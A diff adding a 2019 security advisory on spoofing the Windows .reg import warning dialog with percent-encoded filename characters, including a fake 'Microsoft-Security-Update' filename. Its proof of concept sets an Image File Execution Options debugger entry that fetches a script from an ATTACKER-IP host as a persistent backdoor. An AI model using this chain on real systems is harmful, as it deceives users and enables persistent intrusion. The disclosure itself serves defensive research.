@@ -1,0 +1,143 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.REG-FILE-DIALOG-BOX-MESSAGE-SPOOFING.txt
+[+] ISR: ApparitionSec          
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+A file with the .reg file extension is a Registration file used by the Windows registry. These files can contain hives, keys, and values.
+.reg files can be created from scratch in a text editor or can be produced by the Windows registry when backing up parts of the registry.
+
+
+[Vulnerability Type]
+Windows .Reg File Dialog Box Message Spoofing
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+The Windows registry editor allows specially crafted .reg filenames to spoof the default registry dialog warning box presented to an end user.
+This can potentially trick unsavvy users into choosing the wrong selection shown on the dialog box. Furthermore, we can deny the registry editor
+its ability to show the default secondary status dialog box (Win 10), thereby hiding the fact that our attack was successful.
+
+Normally when a user opens a .reg file UAC will launch (if user is run as Admin) if targeting a non privleged user we can still hijack HKCU reg settings
+without having to deal with UAC. After they will get the registry security warning dialog box asking them if they "trust the source" and
+"Are you sure you want to continue?" etc and will also have a choice of either 'Yes' or 'No' to select from.
+
+However, we can inject our own messages thru the filename to direct the user to wrongly click "Yes", as the expected "Are you sure you want to continue?"
+dialog box message is under our control. The registry dialog echoes back the filename plus any text we add and allows us to terminate part of its
+default security warning message. We achieve this using % encoded characters in the filename like %n or %r and %0.
+
+Example, the "do not add it to the registry" and "Are you sure you want to continue?" default warning messages can be done away with using %0.
+
+This spoofing flaw lets us spoof the "Are you sure you want to continue?" warning message to instead read "Click Yes" or whatever else we like.
+Potentially making a user think they are cancelling the registry import as the security warning dialog box is now lying to them.
+
+Denial of secondary registry editor status dialog box (hiding successful attacks) in Windows 10:
+------------------------------------------------------------------------------------------------
+Typically, upon a successful import the registry editor pops up another dialog box with a status message telling us
+"the keys and values contained in <REGFILE> have been successfully added to the registry".
+
+We can obstruct that behavior to deny this secondary registry editor dialog from appearing by tacking on a (null) right before the
+end of our filename using %1 or %25 like: "Microsoft-Security-Update-v1.2-Windows-10.r%e%g%r%nC%l%i%c%k%b%Y%e%s%b%b%b%1%0.reg"
+
+If don't want to use (null) use %3 but it will display a asian char instead but still prevents the secondary registry dialog box you.
+You will have to manually refresh the registry written to in order to see the values stored when using these dialog denial of service methods.
+
+Note: Denial of the secondary dialog box seems to only work on Windows 10.
+
+Behaviors I discovered playing with registry filenames that affect the dialog box, depending on Windows OS version you will get different results.
+
+% - can be used for obfuscation e.g. %h%a%t%e = hate
+%b will create white-space
+%n makes a newline
+%r makes a newline
+%1 creates (null) - important as we prevent the second registry dialog from appearing after a successful import!
+%0 Important terminates string
+%25 (Windows 10) creates (null) - Important as we prevent the second registry dialog from appearing after a successful import!
+%3 - Important as we prevent the second registry dialog from appearing after a successful import! (but shows asian char)
+%5 (Windows 10) duplicates the default registry dialog box message by "n" amount of times per amount of %5 injected into the filename 
+%25 (Windows 7) duplicates the default registry dialog box message by "n" amount of times per amount of %25 injected into the filename 
+%2525 prevents registry editor from opening
+%169 will show our junky filename in the dialog box (we don't want that)
+%3, %197, %17 and some others change the default language shown in the registry dialog box to asian characters etc
+
+Each injected character can be separated by a percent "%" sign without messing up our spoofed message, we can leverage this to obfuscate the end of the filename.
+We then use %0 to terminate the message string so that the second .reg extension and default registry messages are not displayed in the registry dialog box.
+
+The filename "Microsoft-Security-Update-v1.2-Windows-10.r%e%g%r%nC%l%i%c%k%b%Y%e%s%b%b%b%1%0.reg" will show as "Microsoft-Security-Update-v1.2-Windows-10.reg"
+in the registry dialog box, along with our spoofed user directions.
+ 
+While this spoofing vulnerability requires user interaction and bypassing Windows UAC (if targeting Admin) prompt to succeed, the fact the we can prevent secondary
+registry dialogs and modify registry messages displayed to the user makes it a viable attack vector. If we are successful in our attack we can achieve a persistent
+RCE backdoor all while the user thinks they have aborted the import. Moreover, targeting a non privileged user allows us to hijack programs and not worry about UAC.
+
+
+[POC Video URL]
+https://vimeo.com/322684636
+
+
+[Exploit/POC]
+Persistent Remote Code Execution Backdoor: 
+
+This will add entry to "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe"
+for a persistent rundll32 payload targeting MSIE that references a JScript XML based file on our remote server.
+
+1) Create a Windows .REG Registry file named.
+
+"Microsoft-Security-Update-v1.2-Windows-10.r%e%g%r%nC%l%i%c%k%b%Y%e%s%b%b%b%1%0.reg"
+
+Registry file Contents.
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe]
+"debugger"="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://<ATTACKER-IP>/backdoor\")"
+
+
+2) Create an XML file hosted at http://ATTACKER-IP/backdoor named simply as "backdoor" will execute Windows calc.exe when Microsoft Internet Explorer is launched.
+
+<?xml version="1.0"?>
+<package>
+<component id="testCalc">
+<script language="JScript">
+<![CDATA[
+new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+]]>
+</script>
+</component>
+</package>
+
+
+
+[Network Access]
+Local
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: March 1, 2019
+MSRC Response: " A registry file was created with the title you suggested, but the error message was clear."
+Then vendor sent me a link pointing me to the "Definition of a Security Vulnerability" Lol.
+March 10, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
